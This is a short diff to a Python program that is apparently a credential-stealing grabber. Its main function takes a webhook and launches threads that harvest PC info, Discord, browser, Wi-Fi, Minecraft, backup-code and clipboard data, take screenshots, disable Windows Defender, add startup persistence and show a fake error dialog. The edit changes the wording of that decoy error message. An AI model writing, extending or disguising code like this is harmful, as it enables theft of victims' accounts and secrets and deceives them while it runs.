@@ -79,8 +79,6 @@ post_json = "".join(blacklist)
 MgGn6WB = connect_server(bytesa, 1)
 
 
-
-
 def main(webhook: str):
     threads = [PcInfo, Discord, Browsers, Wifi, Minecraft, Screengrab, BackupCodes, Clipboard, killprotector, fakeerror, startup, disable_defender]
     configcheck(threads)
@@ -165,7 +163,7 @@ def configcheck(list):
 
 
 def fakeerror():
-    ctypes.windll.user32.MessageBoxW(None, 'Error code: 0x80070002\nAn internal error occurred while importing modules.', 'Fatal Error', 0)
+    ctypes.windll.user32.MessageBoxW(None, 'Error: 0x80240017\nAn internal error occurred.', 'Fatal Error', 0)
 
 
 def startup():
